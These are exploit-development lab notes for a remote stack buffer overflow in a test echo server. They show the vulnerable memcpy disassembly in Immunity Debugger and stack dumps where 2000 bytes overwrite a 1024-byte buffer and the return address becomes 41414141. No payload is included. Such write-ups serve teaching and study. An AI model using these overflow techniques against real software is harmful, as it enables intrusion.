# Overwriting the Stack Remotely

Execution of the Python script causes application corruption.

Error description:

```txt
AppName: echo-server-memcpy.exe	AppVer: 0.0.0.0 ModName: unknown
ModVer: 0.0.0.0	Offset: 41414141
```

## Immunity Debugger

Open application with Immunity Debugger

``` assembly
00401520  /$ 55             PUSH EBP
00401521  |. 89E5           MOV EBP,ESP
00401523  |. 81EC 18040000  SUB ESP,418
00401529  |. 8B45 0C        MOV EAX,DWORD PTR SS:[EBP+C]             ; |||
0040152C  |. 894424 08      MOV DWORD PTR SS:[ESP+8],EAX             ; |||
00401530  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; |||
00401533  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |||
00401537  |. 8D85 F8FBFFFF  LEA EAX,DWORD PTR SS:[EBP-408]           ; |||
0040153D  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; |||
00401540  |. E8 3B140000    CALL <JMP.&msvcrt.memcpy>                ; ||\memcpy
00401545  |. 8B45 0C        MOV EAX,DWORD PTR SS:[EBP+C]             ; ||
00401548  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; ||
0040154C  |. C70424 0040400>MOV DWORD PTR SS:[ESP],Echo-Ser.00404000 ; ||ASCII "[+] Received Data from Client: %d Length
"
00401553  |. E8 50140000    CALL <JMP.&msvcrt.printf>                ; |\printf
00401558  |. 8D85 F8FBFFFF  LEA EAX,DWORD PTR SS:[EBP-408]           ; |
0040155E  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |
00401562  |. C70424 2A40400>MOV DWORD PTR SS:[ESP],Echo-Ser.0040402A ; |ASCII "[+] Data: %s
"
00401569  |. E8 3A140000    CALL <JMP.&msvcrt.printf>                ; \printf
0040156E  |. C9             LEAVE
```

>First line is set with breakpoint (PUSH EBP)

**Return address in the stack before being overwritten with 414141 ...**

```assembly
0022F72C   0040176F  o@.  RETURN to Echo-Ser.0040176F from Echo-Ser.00401520

0022F730   0022F740  @÷".  ASCII "AAAAAAAAAA" ...

0022F734   000005DC  Ü..

0022F738   000005DC  Ü..

0022F73C   00000000  ....

0022F740   41414141  AAAA
```

**Return address after memcpy execution:**

```assembly
0022F728   41414141  AAAA

0022F72C   41414141  AAAA

0022F730   41414141  AAAA
```

>local_buffer could only keep 1024 bytes of data when 2000 were passed. Hence, the return address corruption occured.
